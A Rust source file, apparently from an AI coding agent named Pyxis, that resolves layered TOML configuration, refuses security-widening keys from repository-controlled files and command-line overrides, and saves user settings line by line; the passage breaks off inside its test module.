//! Persistent settings and declarative configuration (US-016).
//!
//! Two files, one format: the **global** `~/.pyxis/settings.toml`
//! (user-controlled, the only one written by `/models`, `/effort` and the permission
//! menu) and the **project** `<workspace>/.pyxis/config.toml` (controlled by the
//! repository, hence read with suspicion). Reading goes through the reference TOML
//! parser; writing stays a line upsert, which preserves the
//! comments of the file without pulling `toml_edit` into the graph.
//!
//! Precedence (US-005): every layer is NAMED by `ConfigLayer` and carries a
//! declared `precedence()`. Resolution compares those numbers, never the order
//! the layers happen to be applied in, and `/status` can therefore say where an
//! effective value comes from.

use std::io;
use std::path::{Path, PathBuf};

use agent_core::sandbox::SandboxPolicy;
use agent_tools::PermissionMode;
use agent_tools::hooks::{HookEvent, HookSpec};

const SETTINGS_FILE: &str = "settings.toml";
const PROJECT_CONFIG_FILE: &str = "config.toml";
pub const PERMISSION_MODE_KEY: &str = "permission_mode";
pub(crate) const REASONING_EFFORT_KEY: &str = "reasoning_effort";
pub(crate) const MODEL_KEY: &str = "model";
pub(crate) const WRITABLE_ROOTS_KEY: &str = "writable_roots";
pub(crate) const SANDBOX_MODE_KEY: &str = "sandbox_mode";
pub(crate) const HOOKS_KEY: &str = "hooks";
/// Name of the profile applied to this session (US-006). A security key: the
/// selected table may carry `permission_mode`, so a workspace file that could
/// pick a profile would widen a perimeter by proxy.
pub(crate) const PROFILE_KEY: &str = "profile";
/// Table of the declared profiles: `[profiles.<name>]`.
pub(crate) const PROFILES_KEY: &str = "profiles";
pub const TOKEN_BUDGET_KEY: &str = "token_budget";
pub const COST_BUDGET_KEY: &str = "cost_budget_micro_usd";
pub const INPUT_COST_KEY: &str = "input_cost_micro_per_ktok";
pub const OUTPUT_COST_KEY: &str = "output_cost_micro_per_ktok";
pub const OVERLOAD_FALLBACK_KEY: &str = "overload_fallback_model";
/// Global only (security key). Hosted web search runs on the BACKEND, so it
/// reaches the network from there and the local allow-list proxy never sees it.
/// Enabling it is therefore a perimeter decision, not a feature toggle, and a
/// workspace file must not be able to take it.
pub const WEB_SEARCH_KEY: &str = "web_search";
/// Global only (security key). Programs the user declares side-effect free, on
/// top of the built-in table (US-007). Widening what runs without a
/// confirmation is exactly what a repository must not be able to do.
pub const SAFE_COMMANDS_KEY: &str = "safe_commands";

/// Recognized keys. A key absent from this list is reported without failing
/// the startup (AC5): a file written for a newer version
/// must stay usable.
pub(crate) const KNOWN_KEYS: &[&str] = &[
    MODEL_KEY,
    REASONING_EFFORT_KEY,
    PERMISSION_MODE_KEY,
    SANDBOX_MODE_KEY,
    WRITABLE_ROOTS_KEY,
    HOOKS_KEY,
    PROFILE_KEY,
    PROFILES_KEY,
    TOKEN_BUDGET_KEY,
    COST_BUDGET_KEY,
    INPUT_COST_KEY,
    OUTPUT_COST_KEY,
    OVERLOAD_FALLBACK_KEY,
    WEB_SEARCH_KEY,
    SAFE_COMMANDS_KEY,
];

/// Keys that widen a security perimeter. A workspace-controlled file
/// can NEVER define them (AC4, FR-07): that is exactly the
/// vector of CVE-2026-48124, where a hooks declaration coming from the repository gave
/// execution outside the sandbox. `hooks` was listed here before existing as a
/// capability: the door was closed before it had a lock, and US-017 now puts the
/// lock behind it.
pub(crate) const SECURITY_KEYS: &[&str] = &[
    PERMISSION_MODE_KEY,
    SANDBOX_MODE_KEY,
    WRITABLE_ROOTS_KEY,
    HOOKS_KEY,
    PROFILE_KEY,
    WEB_SEARCH_KEY,
    SAFE_COMMANDS_KEY,
];

/// Canonical identifiers of the permission modes, in the order of the picker.
/// The aliases `permission_mode_from_arg` also accepts are deliberately absent:
/// this is the list a refusal shows the user (US-008 AC3).
pub const PERMISSION_MODE_IDS: &[&str] =
    &["ask", "accept-edits", "auto", "full-access", "read-only"];

/// Where an effective value comes from (US-005). Codex names its layers the same
/// way and orders them by an explicit `precedence()`
/// (`codex-rs/config/src/config_layer_source.rs:31`); the gaps between the
/// numbers leave room to insert a layer without renumbering the others.
///
/// `precedence` and `label` match EXHAUSTIVELY on purpose (AC5): a layer added
/// here without a declared precedence does not compile.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ConfigLayer {
    /// `~/.pyxis/settings.toml`, user-owned.
    GlobalFile,
    /// The `[profiles.<name>]` table selected for this session (US-006).
    Profile,
    /// `<workspace>/.pyxis/config.toml`, repository-owned.
    ProjectFile,
    /// `PYXIS_*` variables of the environment.
    Environment,
    /// `-c key=value` and the typed flags of the command line (US-007, US-008).
    SessionFlags,
}

impl ConfigLayer {
    pub const fn precedence(self) -> i16 {
        match self {
            Self::GlobalFile => 10,
            Self::Profile => 15,
            Self::ProjectFile => 20,
            Self::Environment => 25,
            Self::SessionFlags => 30,
        }
    }

    /// Name shown by `/status` next to the value the layer carries (AC2).
    pub const fn label(self) -> &'static str {
        match self {
            Self::GlobalFile => "global settings",
            Self::Profile => "profile",
            Self::ProjectFile => "project config",
            Self::Environment => "environment",
            Self::SessionFlags => "command line",
        }
    }

    /// Declared layers, weakest first. Used to prove the ordering, and read by
    /// the configuration catalog (US-102), which renders one row per layer from
    /// `precedence()` and `label()` rather than spelling the five out again. The
    /// guarantee that a NEW layer carries a precedence comes from the exhaustive
    /// matches above, not from this list.
    #[cfg(test)]
    pub(crate) const ALL: &'static [Self] = &[
        Self::GlobalFile,
        Self::Profile,
        Self::ProjectFile,
        Self::Environment,
        Self::SessionFlags,
    ];
}

/// Layer that owns each effective value (US-005 AC2). A key absent from here is
/// at its default: `/status` then says nothing about it, because "default"
/// is not a layer someone declared.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Provenance {
    owners: Vec<(&'static str, ConfigLayer)>,
}

impl Provenance {
    pub fn layer(&self, key: &str) -> Option<ConfigLayer> {
        self.owners
            .iter()
            .find(|(owned, _)| *owned == key)
            .map(|(_, layer)| *layer)
    }

    /// Whether `layer` may write `key`. The comparison is on the DECLARED
    /// precedence (AC3), so the resolution stays correct whatever order the
    /// layers are applied in.
    pub fn accepts(&self, key: &str, layer: ConfigLayer) -> bool {
        self.layer(key)
            .is_none_or(|owner| layer.precedence() >= owner.precedence())
    }

    /// Records `layer` as the owner of `key`, unless a stronger layer already
    /// owns it. Equal precedence takes over: two declarations of the same layer
    /// are applied in order and the last one wins (US-007 AC5).
    pub fn claim(&mut self, key: &'static str, layer: ConfigLayer) {
        if !self.accepts(key, layer) {
            return;
        }
        match self.owners.iter_mut().find(|(owned, _)| *owned == key) {
            Some(entry) => entry.1 = layer,
            None => self.owners.push((key, layer)),
        }
    }
}

/// Effective configuration after merging the files. Each optional field
/// means "not defined": `main.rs` then layers the environment and the
/// arguments on top, and applies a default only as a last resort.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Config {
    pub model: Option<String>,
    pub reasoning_effort: Option<String>,
    /// Global only (security key).
    pub permission_mode: Option<PermissionMode>,
    /// Global only (security key). Identifier of the sandbox policy (US-001),
    /// already checked against `SandboxPolicy::IDS`. Kept as a string because
    /// building the policy needs the workspace and the resolved writable roots,
    /// which only `main.rs` holds.
    pub sandbox_mode: Option<String>,
    /// Global only (security key).
    pub writable_roots: Vec<PathBuf>,
    /// Global only (security key). Commands run around each tool call (US-017),
    /// with a right of veto over it.
    pub hooks: Vec<HookSpec>,
    pub token_budget: Option<u64>,
    pub cost_budget_micro_usd: Option<u64>,
    pub input_cost_micro_per_ktok: Option<u64>,
    pub output_cost_micro_per_ktok: Option<u64>,
    pub overload_fallback_model: Option<String>,
    /// Global only (security key). Hosted web search, executed by the backend.
    /// Off by default: it is the one tool whose network traffic the local
    /// sandbox cannot see, let alone filter.
    pub web_search: bool,
    /// Global only (security key). Programs declared side-effect free on top of
    /// the built-in table (US-007).
    pub safe_commands: Vec<agent_tools::command::SafeCommand>,
    /// Profile applied to this session (US-006), `None` when none was selected.
    /// Kept for `/status`: a profile that changes four keys at once is otherwise
    /// invisible in the effective values.
    pub profile: Option<String>,
    /// Layer each non-default value comes from (US-005 AC2).
    pub sources: Provenance,
    /// Loading diagnostics: syntax, unknown key, discarded security
    /// key. Never fatal (FR-12); the caller writes them to stderr.
    pub warnings: Vec<String>,
}

/// One resolution request. Built by `main.rs`, the only holder of `Args`.
#[derive(Debug, Clone, Copy, Default)]
pub struct Request<'a> {
    pub global: Option<&'a Path>,
    pub project: Option<&'a Path>,
    /// Profile named on the command line (US-006). Outranks the `profile` key,
    /// which only a global file may carry.
    pub profile: Option<&'a str>,
    /// `-c key=value` in command-line order (US-007). Untrusted like a workspace
    /// file: an argument can come from a script of the repository, so it is no
    /// more trustworthy than `config.toml` and a security key is refused.
    pub overrides: &'a [(String, String)],
    /// Typed flags the user spelled out (US-008). Same precedence as `-c`, but
    /// allowed to carry a security key: `--permission-mode` and `--sandbox`
    /// exist precisely to choose a perimeter for one session, and `main.rs`
    /// announces the widening.
    pub flags: Flags<'a>,
}

/// The typed flags of the command line, already validated by the argument
/// parser: that is where an unknown value is refused by name (US-008 AC3).
#[derive(Debug, Clone, Copy, Default)]
pub struct Flags<'a> {
    pub model: Option<&'a str>,
    pub permission_mode: Option<PermissionMode>,
    pub sandbox_mode: Option<&'a str>,
}

/// Where a configuration file comes from. Determines whether it is allowed to touch
/// the security keys.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Scope {
    /// `~/.pyxis/settings.toml`: user-controlled.
    Global,
    /// `<workspace>/.pyxis/config.toml`: repository-controlled.
    Project,
}

/// Path of the project configuration file. Under `.pyxis/`, hence already
/// covered by the write refusal of the editing tools (US-013): the agent
/// cannot rewrite its own configuration.
pub fn project_config_path(workspace: &Path) -> PathBuf {
    workspace.join(".pyxis").join(PROJECT_CONFIG_FILE)
}

/// Merges every layer by declared precedence (US-005).
///
/// Returns an error ONLY where the PRD asks the startup to stop: a profile that
/// does not exist (US-006 AC4) and a `-c` value that does not convert
/// (US-007 AC4). Everything else degrades to a warning, the rule the files
/// already followed: a missing, unreadable or syntactically invalid file never
/// prevents startup (FR-12).
pub fn resolve(request: Request<'_>) -> Result<Config, String> {
    let mut config = Config::default();
    // Files parsed once: their tables are read twice, for their own keys and for
    // the profiles they declare.
    let mut files = Vec::new();
    for (path, scope) in [
        (request.global, Scope::Global),
        (request.project, Scope::Project),
    ] {
        let Some(path) = path else { continue };
        if let Some(table) = read_table(path, &mut config.warnings) {
            files.push((path, scope, table));
        }
    }

    // Selection BEFORE application: an unknown profile must be refused before a
    // single value is applied. The `profile` key of a project file is dropped by
    // the security gate of `apply_table` rather than read here.
    let selected = request
        .profile
        .map(|name| name.trim().to_string())
        .filter(|name| !name.is_empty())
        .or_else(|| {
            files
                .iter()
                .filter(|(_, scope, _)| *scope == Scope::Global)
                .find_map(|(_, _, table)| table.get(PROFILE_KEY))
                .and_then(|value| non_empty_string(value).ok())
        });
    if let Some(name) = selected.as_deref() {
        apply_profile(&mut config, &files, name)?;
    }

    for (path, scope, table) in &files {
        let layer = match scope {
            Scope::Global => ConfigLayer::GlobalFile,
            Scope::Project => ConfigLayer::ProjectFile,
        };
        apply_table(
            &mut config,
            &path.display().to_string(),
            *scope,
            layer,
            table,
        );
    }

    apply_overrides(&mut config, request.overrides)?;
    apply_flags(&mut config, request.flags);
    config.profile = selected;
    Ok(config)
}

fn read_table(path: &Path, warnings: &mut Vec<String>) -> Option<toml::Table> {
    let contents = match std::fs::read_to_string(path) {
        Ok(contents) => contents,
        Err(err) if err.kind() == io::ErrorKind::NotFound => return None,
        Err(err) => {
            warnings.push(format!("{}: {err}", path.display()));
            return None;
        }
    };
    match contents.parse::<toml::Table>() {
        Ok(table) => Some(table),
        Err(err) => {
            // AC3: name the file, the line and the key. `toml` already reports
            // the span and an annotated excerpt; we prefix with the path, and
            // flatten the multi-line rendering to fit on one stderr line.
            warnings.push(format!(
                "{}: {}",
                path.display(),
                err.to_string().replace('\n', " | ")
            ));
            None
        }
    }
}

/// Applies the selected profile (US-006). Its table is a layer of its own, so it
/// beats the bare global file and loses to the session overrides. The scope of
/// the FILE that declares it decides whether it may carry a security key (AC3):
/// a profile written by the repository widens nothing.
///
/// A profile of the same name declared in both files refines the global one: the
/// files are visited global first, and equal precedence lets the later entry
/// take over. That is the same rule as for the top-level keys, minus the security
/// keys, which the project scope never gets.
fn apply_profile(
    config: &mut Config,
    files: &[(&Path, Scope, toml::Table)],
    name: &str,
) -> Result<(), String> {
    let mut declared = false;
    let mut applied = false;
    for (path, scope, table) in files {
        let Some(entry) = table
            .get(PROFILES_KEY)
            .and_then(toml::Value::as_table)
            .and_then(|profiles| profiles.get(name))
        else {
            continue;
        };
        declared = true;
        let Some(profile) = entry.as_table() else {
            config.warnings.push(format!(
                "{}: profile `{name}`: expected a table (ignored)",
                path.display()
            ));
            continue;
        };
        applied = true;
        apply_table(
            config,
            &format!("{}: profile `{name}`", path.display()),
            *scope,
            ConfigLayer::Profile,
            profile,
        );
    }
    if !declared {
        // AC4: name the profile asked for, and the ones that do exist.
        return Err(format!(
            "unknown profile `{name}`. Declared: {}",
            declared_profiles(files)
        ));
    }
    if !applied {
        return Err(format!("profile `{name}`: expected a table of settings"));
    }
    Ok(())
}

fn declared_profiles(files: &[(&Path, Scope, toml::Table)]) -> String {
    let mut names: Vec<&str> = files
        .iter()
        .filter_map(|(_, _, table)| table.get(PROFILES_KEY)?.as_table())
        .flat_map(|profiles| profiles.keys().map(String::as_str))
        .collect();
    names.sort_unstable();
    names.dedup();
    if names.is_empty() {
        return "none".to_string();
    }
    names.join(", ")
}

/// Applies one table as `layer`. `origin` prefixes every diagnostic: a file path,
/// or a file path and a profile name.
fn apply_table(
    config: &mut Config,
    origin: &str,
    scope: Scope,
    layer: ConfigLayer,
    table: &toml::Table,
) {
    for (key, value) in table {
        let key = key.as_str();
        if layer == ConfigLayer::Profile && (key == PROFILE_KEY || key == PROFILES_KEY) {
            config
                .warnings
                .push(format!("{origin}: `{key}` has no meaning inside a profile"));
            continue;
        }
        if scope == Scope::Project && SECURITY_KEYS.contains(&key) {
            // AC4: the warning names the layer that tried, as well as the reason.
            config.warnings.push(format!(
                "{origin}: security key `{key}` ignored ({} layer: a workspace-controlled file cannot widen a security perimeter)",
                layer.label()
            ));
            continue;
        }
        let Some(key) = known_key(key) else {
            config
                .warnings
                .push(format!("{origin}: unknown key `{key}`"));
            continue;
        };
        // AC3: a stronger layer already owns the key, so this value is not
        // applied at all rather than applied and overwritten by application order.
        if !config.sources.accepts(key, layer) {
            continue;
        }
        match apply_key(config, key, value) {
            // A key made of several entries (`hooks`) reports per entry: one bad
            // declaration is discarded, the others stand (FR-14).
            Ok(details) => {
                config.sources.claim(key, layer);
                for detail in details {
                    config.warnings.push(format!("{origin}: {key}: {detail}"));
                }
            }
            // A rejected value claims nothing: the provenance must never name a
            // layer whose value was discarded.
            Err(err) => config.warnings.push(format!("{origin}: {key}: {err}")),
        }
    }
}

/// `-c key=value` (US-007). Refused on a security key and reported on an unknown
/// one, both without preventing startup; a value that does not convert stops it.
fn apply_overrides(config: &mut Config, overrides: &[(String, String)]) -> Result<(), String> {
    for (raw_key, raw_value) in overrides {
        let key = raw_key.trim();
        if key == PROFILES_KEY {
            config.warnings.push(format!(
                "-c {key}: a profile is declared in a file, not on the command line (ignored)"
            ));
            continue;
        }
        if SECURITY_KEYS.contains(&key) {
            // AC2: an argument can come from a script of the repository, so it is
            // no more trustworthy than a workspace file and gets the same refusal.
            // It does not prevent the startup.
            config.warnings.push(format!(
                "-c {key}: security key, refused (declare it in the global settings file)"
            ));
            continue;
        }
        let Some(key) = known_key(key) else {
            config
                .warnings
                .push(format!("-c {key}: unknown key (ignored)"));
            continue;
        };
        if !config.sources.accepts(key, ConfigLayer::SessionFlags) {
            continue;
        }
        let value = override_value(raw_value);
        match apply_key(config, key, &value) {
            Ok(details) => {
                config.sources.claim(key, ConfigLayer::SessionFlags);
                for detail in details {
                    config.warnings.push(format!("-c {key}: {detail}"));
                }
            }
            // AC4: the key, the value received and the expected type. An argument
            // the user typed with an unusable value is an error, not a
            // degradation: ignoring it would run a session they did not ask for.
            Err(err) => return Err(format!("-c {key}={raw_value}: {err}")),
        }
    }
    Ok(())
}

/// A `-c` value is written in TOML syntax. Wrapping it in a one-key document is
/// the only way the parser exposes to read a bare value, and it keeps the types
/// the file layers already accept (`7`, `true`, `["a", "b"]`). Anything that is
/// not TOML syntax is a bare string, which is what `-c model=gpt-5.6` means.
fn override_value(raw: &str) -> toml::Value {
    match format!("value = {raw}").parse::<toml::Table>() {
        Ok(table) => table
            .get("value")
            .cloned()
            .unwrap_or_else(|| toml::Value::String(raw.to_string())),
        Err(_) => toml::Value::String(raw.to_string()),
    }
}

/// Typed flags (US-008). Applied AFTER `-c`, at the same precedence: a flag the
/// user spelled out wins over a generic override of the same key.
fn apply_flags(config: &mut Config, flags: Flags<'_>) {
    if let Some(model) = flags.model {
        config.model = Some(model.to_string());
        config.sources.claim(MODEL_KEY, ConfigLayer::SessionFlags);
    }
    if let Some(mode) = flags.permission_mode {
        config.permission_mode = Some(mode);
        config
            .sources
            .claim(PERMISSION_MODE_KEY, ConfigLayer::SessionFlags);
    }
    if let Some(id) = flags.sandbox_mode {
        config.sandbox_mode = Some(id.to_string());
        config
            .sources
            .claim(SANDBOX_MODE_KEY, ConfigLayer::SessionFlags);
    }
}

fn known_key(key: &str) -> Option<&'static str> {
    KNOWN_KEYS.iter().copied().find(|known| *known == key)
}

/// US-005 AC2: the layers `/status` names, keyed by the vocabulary the frontend
/// renders. A key absent from the result is at its default value.
pub fn status_sources(config: &Config) -> Vec<(&'static str, &'static str)> {
    [
        (MODEL_KEY, agent_tui::SOURCE_KEY_MODEL),
        (REASONING_EFFORT_KEY, agent_tui::SOURCE_KEY_REASONING_EFFORT),
        (PERMISSION_MODE_KEY, agent_tui::SOURCE_KEY_PERMISSION_MODE),
        (SANDBOX_MODE_KEY, agent_tui::SOURCE_KEY_SANDBOX_MODE),
    ]
    .into_iter()
    .filter_map(|(key, displayed)| {
        config
            .sources
            .layer(key)
            .map(|layer| (displayed, layer.label()))
    })
    .collect()
}

fn apply_key(config: &mut Config, key: &str, value: &toml::Value) -> Result<Vec<String>, String> {
    let mut details = Vec::new();
    match key {
        MODEL_KEY => config.model = Some(non_empty_string(value)?),
        REASONING_EFFORT_KEY => config.reasoning_effort = Some(non_empty_string(value)?),
        PERMISSION_MODE_KEY => {
            let raw = non_empty_string(value)?;
            let mode = permission_mode_from_arg(&raw)
                .ok_or_else(|| format!("unknown permission mode `{raw}`"))?;
            config.permission_mode = Some(mode);
        }
        SANDBOX_MODE_KEY => {
            let raw = non_empty_string(value)?;
            if !SandboxPolicy::IDS.contains(&raw.as_str()) {
                return Err(format!(
                    "unknown sandbox mode `{raw}` (expected one of: {})",
                    SandboxPolicy::IDS.join(", ")
                ));
            }
            config.sandbox_mode = Some(raw);
        }
        WRITABLE_ROOTS_KEY => {
            let array = value
                .as_array()
                .ok_or_else(|| "expected an array of paths".to_string())?;
            let mut roots = Vec::with_capacity(array.len());
            for entry in array {
                roots.push(PathBuf::from(non_empty_string(entry)?));
            }
            config.writable_roots = roots;
        }
        HOOKS_KEY => config.hooks = parse_hooks(value, &mut details)?,
        // Both are consumed by `resolve`, which needs them BEFORE the layers are
        // applied. Their shape is still checked here so that a malformed
        // declaration is reported like any other key rather than staying silent.
        PROFILE_KEY => {
            non_empty_string(value)?;
        }
        PROFILES_KEY => {
            value
                .as_table()
                .ok_or_else(|| "expected a table of profiles".to_string())?;
        }
        TOKEN_BUDGET_KEY => config.token_budget = Some(positive_u64(value)?),
        COST_BUDGET_KEY => config.cost_budget_micro_usd = Some(positive_u64(value)?),
        INPUT_COST_KEY => config.input_cost_micro_per_ktok = Some(positive_u64(value)?),
        OUTPUT_COST_KEY => config.output_cost_micro_per_ktok = Some(positive_u64(value)?),
        OVERLOAD_FALLBACK_KEY => config.overload_fallback_model = Some(non_empty_string(value)?),
        WEB_SEARCH_KEY => {
            config.web_search = value
                .as_bool()
                .ok_or_else(|| "expected a boolean".to_string())?;
        }
        SAFE_COMMANDS_KEY => config.safe_commands = parse_safe_commands(value, &mut details)?,
        // `KNOWN_KEYS` filters upstream: this arm is unreachable and must
        // above all not panic should the list and this match ever diverge.
        other => return Err(format!("unhandled key `{other}`")),
    }
    Ok(details)
}

/// Hook declarations (US-017). An invalid entry is discarded with its reason and
/// never fails the startup; the valid entries of the same array are kept.
/// `safe_commands = [{ program = "just", subcommands = ["--list"] }]`.
///
/// A malformed entry is dropped with its reason, like a malformed hook: the
/// session starts, and the user learns which line did nothing. The semantic
/// checks (a path, a program the built-in table already covers) belong to
/// `CommandPolicy::from_entries`, which is where the security rule lives.
fn parse_safe_commands(
    value: &toml::Value,
    details: &mut Vec<String>,
) -> Result<Vec<agent_tools::command::SafeCommand>, String> {
    let array = value
        .as_array()
        .ok_or_else(|| "expected an array of tables".to_string())?;
    let mut entries = Vec::with_capacity(array.len());
    for (index, entry) in array.iter().enumerate() {
        match parse_safe_command(entry, index, details) {
            Ok(safe) => entries.push(safe),
            Err(err) => details.push(format!("safe_commands #{index}: {err} (ignored)")),
        }
    }
    Ok(entries)
}

const SAFE_COMMAND_KEYS: &[&str] = &["program", "subcommands", "denied"];

fn parse_safe_command(
    entry: &toml::Value,
    index: usize,
    details: &mut Vec<String>,
) -> Result<agent_tools::command::SafeCommand, String> {
    let table = entry
        .as_table()
        .ok_or_else(|| "expected a table".to_string())?;
    for key in table.keys() {
        if !SAFE_COMMAND_KEYS.contains(&key.as_str()) {
            details.push(format!(
                "safe_commands #{index}: unknown key `{key}` ignored"
            ));
        }
    }
    let program = non_empty_string(table.get("program").ok_or("missing `program`")?)?;
    let list = |key: &str| -> Result<Vec<String>, String> {
        match table.get(key) {
            None => Ok(Vec::new()),
            Some(value) => value
                .as_array()
                .ok_or_else(|| format!("`{key}`: expected an array of strings"))?
                .iter()
                .map(non_empty_string)
                .collect(),
        }
    };
    Ok(agent_tools::command::SafeCommand {
        program,
        subcommands: list("subcommands")?,
        denied: list("denied")?,
    })
}

fn parse_hooks(value: &toml::Value, details: &mut Vec<String>) -> Result<Vec<HookSpec>, String> {
    let array = value
        .as_array()
        .ok_or_else(|| "expected an array of tables".to_string())?;
    let mut hooks = Vec::with_capacity(array.len());
    for (index, entry) in array.iter().enumerate() {
        match parse_hook(entry, index, details) {
            Ok(spec) => hooks.push(spec),
            Err(err) => details.push(format!("hook #{index}: {err} (ignored)")),
        }
    }
    Ok(hooks)
}

const HOOK_KEYS: &[&str] = &["event", "matcher", "command", "args"];

fn parse_hook(
    entry: &toml::Value,
    index: usize,
    details: &mut Vec<String>,
) -> Result<HookSpec, String> {
    let table = entry
        .as_table()
        .ok_or_else(|| "expected a table".to_string())?;
    for key in table.keys() {
        if !HOOK_KEYS.contains(&key.as_str()) {
            details.push(format!("hook #{index}: unknown key `{key}` ignored"));
        }
    }
    let raw_event = non_empty_string(table.get("event").ok_or("missing `event`")?)?;
    let event = HookEvent::parse(&raw_event).ok_or_else(|| {
        format!(
            "unknown event `{raw_event}` (expected one of: {})",
            agent_tools::HOOK_EVENT_NAMES.join(", ")
        )
    })?;
    let command = non_empty_string(table.get("command").ok_or("missing `command`")?)?;
    let matcher = match table.get("matcher") {
        // A lifecycle event names no tool: a matcher there would select nothing,
        // so it is dropped with its reason rather than silently kept.
        Some(value) if !event.is_tool_scoped() => {
            let matcher = non_empty_string(value)?;
            details.push(format!(
                "hook #{index}: `matcher` (`{matcher}`) ignored on {}, which watches no tool",
                event.name()
            ));
            None
        }
        Some(value) => Some(non_empty_string(value)?),
        None => None,
    };
    let args = match table.get("args") {
        Some(value) => value
            .as_array()
            .ok_or_else(|| "`args`: expected an array of strings".to_string())?
            .iter()
            .map(|arg| {
                arg.as_str()
                    .map(str::to_string)
                    .ok_or_else(|| "`args`: expected an array of strings".to_string())
            })
            .collect::<Result<Vec<_>, _>>()?,
        None => Vec::new(),
    };
    Ok(HookSpec {
        event,
        matcher,
        command,
        args,
    })
}

fn non_empty_string(value: &toml::Value) -> Result<String, String> {
    let raw = value
        .as_str()
        .ok_or_else(|| "expected a string".to_string())?
        .trim();
    if raw.is_empty() {
        return Err("expected a non-empty string".to_string());
    }
    Ok(raw.to_string())
}

fn positive_u64(value: &toml::Value) -> Result<u64, String> {
    let raw = value
        .as_integer()
        .ok_or_else(|| "expected an integer".to_string())?;
    u64::try_from(raw)
        .ok()
        .filter(|value| *value > 0)
        .ok_or_else(|| "expected an integer > 0".to_string())
}

/// Single spelling, owned by the mode itself so the CLI, the picker and the
/// event payload can never drift apart.
pub fn permission_mode_id(mode: PermissionMode) -> &'static str {
    mode.id()
}

pub fn permission_mode_from_arg(arg: &str) -> Option<PermissionMode> {
    match arg.trim().to_ascii_lowercase().as_str() {
        "ask" | "default" | "ask-for-approval" => Some(PermissionMode::Default),
        "accept-edits" | "edits" | "auto-approve-edits" => Some(PermissionMode::AcceptEdits),
        "auto" | "approve-for-me" | "dont-ask" => Some(PermissionMode::DontAsk),
        "full-access" | "full" | "bypass" | "bypass-permissions" => {
            Some(PermissionMode::BypassPermissions)
        }
        "read-only" | "readonly" | "plan" => Some(PermissionMode::Plan),
        _ => None,
    }
}

/// Root of the user state: `$PYXIS_HOME` when set, `~/.pyxis` otherwise. Single
/// source for everything Pyxis writes outside a workspace (settings, and the
/// diagnostics of US-020).
pub fn pyxis_home() -> Option<PathBuf> {
    if let Some(root) = std::env::var_os("PYXIS_HOME") {
        return Some(PathBuf::from(root));
    }
    home_dir().map(|home| home.join(".pyxis"))
}

pub fn default_settings_path() -> Option<PathBuf> {
    pyxis_home().map(|root| root.join(SETTINGS_FILE))
}

pub fn save_permission_mode(path: &Path, mode: PermissionMode) -> io::Result<()> {
    save_string_key(path, PERMISSION_MODE_KEY, Some(permission_mode_id(mode)))
}

pub fn save_reasoning_effort(path: &Path, effort: Option<&str>) -> io::Result<()> {
    save_string_key(
        path,
        REASONING_EFFORT_KEY,
        effort.map(str::trim).filter(|value| !value.is_empty()),
    )
}

pub fn save_model(path: &Path, model: &str) -> io::Result<()> {
    save_string_key(
        path,
        MODEL_KEY,
        Some(model.trim()).filter(|v| !v.is_empty()),
    )
}

/// Creates the (empty) file and its directory when missing. To be called BEFORE the
/// sandbox: Landlock can only grant a write right to an already
/// openable path, and the parent directory itself stays read-only.
pub fn ensure_file(path: &Path) -> io::Result<()> {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .map(|_| ())
}

/// Upsert of a scalar key of the ROOT table, line by line. Deliberately not
/// `toml_edit`: the only thing written here is `key = "value"`, and a line
/// replacement preserves the comments and the order of the user's file. The
/// continuation lines of a multi-line array have no `=` and are therefore
/// copied as is.
///
/// The scan stops at the first table header. `model`, `reasoning_effort` and
/// `permission_mode` are exactly the keys a `[profiles.<name>]` table declares
/// too (US-006), and a line-oriented rewrite that ignored the header would
/// either hijack a profile's value or drop it: the same key seen twice used to
/// be treated as a duplicate of the first. A profile is a setting the user
/// wrote for ANOTHER session, so `/models` has no business editing it.
fn save_string_key(path: &Path, key: &str, value: Option<&str>) -> io::Result<()> {
    let new_line = value.map(|value| format!("{key} = \"{value}\""));
    let contents = match std::fs::read_to_string(path) {
        Ok(contents) => contents,
        Err(err) if err.kind() == io::ErrorKind::NotFound => String::new(),
        Err(err) => return Err(err),
    };

    let mut lines: Vec<String> = Vec::new();
    let mut replaced = false;
    // Index the first table header will occupy, hence the end of the root table.
    let mut header_at: Option<usize> = None;
    for line in contents.lines() {
        if header_at.is_none() && is_table_header(line) {
            header_at = Some(lines.len());
        }
        if header_at.is_none() && is_key_line(line, key) {
            // A second declaration at the root is invalid TOML anyway: dropped,
            // so the file this writes back stays readable by the parser.
            if replaced {
                continue;
            }
            replaced = true;
            if let Some(new_line) = &new_line {
                lines.push(new_line.clone());
            }
            continue;
        }
        lines.push(line.to_string());
    }

    if !replaced && let Some(new_line) = new_line {
        // Appended INSIDE the root table, after its last non-blank line: a key
        // written past a header would silently join that table instead.
        let at = match header_at {
            Some(header) => lines[..header]
                .iter()
                .rposition(|line| !line.trim().is_empty())
                .map_or(header, |last| last + 1),
            None => lines.len(),
        };
        lines.insert(at, new_line);
    }
    let mut contents = lines.join("\n");
    contents.push('\n');

    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(path, contents)
}

fn is_key_line(line: &str, expected_key: &str) -> bool {
    let Some((key, _)) = line.split_once('=') else {
        return false;
    };
    key.trim() == expected_key
}

/// Opening line of a table (`[profiles.review]`, `[[x]]`). Everything after the
/// first one belongs to that table and never to the root.
fn is_table_header(line: &str) -> bool {
    line.trim_start().starts_with('[')
}

pub fn home_dir() -> Option<PathBuf> {
    std::env::var_os("HOME")
        .or_else(|| std::env::var_os("USERPROFILE"))
        .map(PathBuf::from)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The two-file case, with no profile and no override: the resolution the
    /// tests written before EP-002 exercise. Its two failing branches are
    /// unreachable without a profile or an override, and a divergence must
    /// surface as a warning rather than a panic.
    fn load(global: Option<&Path>, project: Option<&Path>) -> Config {
        resolve(Request {
            global,
            project,
            ..Request::default()
        })
        .unwrap_or_else(|err| Config {
            warnings: vec![err],
            ..Config::default()
        })
    }

    fn temp_path(tag: &str) -> PathBuf {
        std::env::temp_dir().join(format!("pyxis-settings-{}-{tag}.toml", std::process::id()))
    }

    /// The file that `save_*` produces must stay readable by the TOML parser:
    /// that is the only contact point between the line upsert and the reading.
    #[test]
    fn saved_file_round_trips_through_the_toml_parser() {
        let path = temp_path("round-trip");
        let _ = std::fs::remove_file(&path);
        std::fs::write(
            &path,
            "# mes reglages\nwritable_roots = [\n  \"/srv/cache\",\n]\n",
        )
